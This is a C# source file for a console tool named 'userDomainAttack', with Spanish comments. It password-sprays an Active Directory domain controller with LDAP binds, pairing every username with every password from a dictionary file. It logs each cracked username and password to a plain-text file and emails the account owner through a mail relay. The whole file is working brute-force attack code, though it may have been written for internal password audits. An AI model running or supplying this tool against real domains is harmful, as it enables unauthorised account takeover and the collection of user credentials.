using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Mail;
using System.DirectoryServices;
using System.Net;
using System.DirectoryServices.Protocols;
using System.IO;
using System.Threading;
using System.Drawing;
using System.Net.Mime;

namespace userDomainAttack
{
    class Program
    {

        
        static void Main(string[] args)
        {
            string mailfrom = ""; //Correo remitente 
            string ipDomainController = ""; //Ip Controlador de dominio
            string relayServer = ""; //Servidor de correo relay
            string Mensaje = ""; //Mensaje en formato html


            Array Listadousuarios = fileToArray("users");
            Array ListadoClaves = fileToArray("dict");
            Array ListadoCorreos = fileToArray("mail");

            Console.WriteLine("Attacking list of users!");
            int Counter = 0;
            foreach (string password in ListadoClaves)
            {
                foreach (string usuario in Listadousuarios)
                {
                    Console.Write("\r" + usuario + "                     ");
                    Boolean resultado = Authenticate(ipDomainController, usuario, password);
                    if (resultado == true)
                    {
                        string correousuario = searchMail(ListadoCorreos, usuario);
                        Console.WriteLine("Encontramos la constraseña " + password + " del usuario " + usuario);
                        string mensaje = ConstruirMensaje(Mensaje, usuario, password);
                        sendRelayMail(relayServer, mailfrom, correousuario, mensaje);
                        log(usuario + "|" + password + "|" + DateTime.Now.ToString() + "|" + correousuario);
                    }
                    Thread.Sleep(3000);
                    Counter++;
                }
            }
        }
        private static Boolean Authenticate(string ipDomainController, string usuario, string password)
        {
            try
            {
                LdapConnection connection = new LdapConnection(ipDomainController);
                NetworkCredential credential = new NetworkCredential(usuario, password);
                connection.Credential = credential;
                connection.Bind();
                Console.WriteLine("logged in");
                return true;
            }
            catch (LdapException lexc)
            {
                String error = lexc.ServerErrorMessage;
                return false;
            }
            catch (Exception exc)
            {
                String error = exc.Message;
                return false;
            }
        }
        private static string sendRelayMail(string relayServer, string mailFrom, string mailTo, string mensaje)
        {
            try
            {
                MailMessage mail = new MailMessage();
                SmtpClient SmtpServer = new SmtpClient(relayServer);
                mail.From = new MailAddress(mailFrom);
                mail.To.Add(mailTo);
                mail.Subject = "¿Tu contraseña es segura?";
                mail.Body = mensaje;
                mail.IsBodyHtml = true;
                
                ///
                Bitmap b = new Bitmap("image.jpg");
                ImageConverter ic = new ImageConverter();
                Byte[] ba = (Byte[])ic.ConvertTo(b, typeof(Byte[]));
                MemoryStream logo = new MemoryStream(ba);

                Attachment imagen = new Attachment("image.jpg", MediaTypeNames.Application.Octet);
                imagen.ContentId = "test001@host";
                mail.Attachments.Add(imagen);

                
                SmtpServer.Send(mail);
                return "Envio exitoso";
            }
            catch (Exception ex)
            {
                return ex.Message;
            }
        }
        private static string ConstruirMensaje(string Mensaje, string usuario, string password)
        {
            string mensaje = Mensaje;
            return mensaje;
        }
        private static Array fileToArray(string archivo)
        {
            string[] lines;
            var list = new List<string>();
            var fileStream = new FileStream(archivo, FileMode.Open, FileAccess.Read);
            using (var streamReader = new StreamReader(fileStream, Encoding.UTF8))
            {
                string line;
                while ((line = streamReader.ReadLine()) != null)
                {
                    list.Add(line);
                }
            }
            lines = list.ToArray();
            return lines;
        }
        private static string searchMail(Array correos, string usuario)
        {
            foreach (string x in correos)
            {
                if (x.Contains(usuario))
                {
                    List<string> names = x.Split(',').ToList<string>();
                    return names[1];
                }
            }

            return "User not found!";
        }
        private static void log(string registro)
        {
            using (System.IO.StreamWriter file =
                new System.IO.StreamWriter("log.txt", true))
            {
                file.WriteLine(registro);
            }
        }
    }
}

        
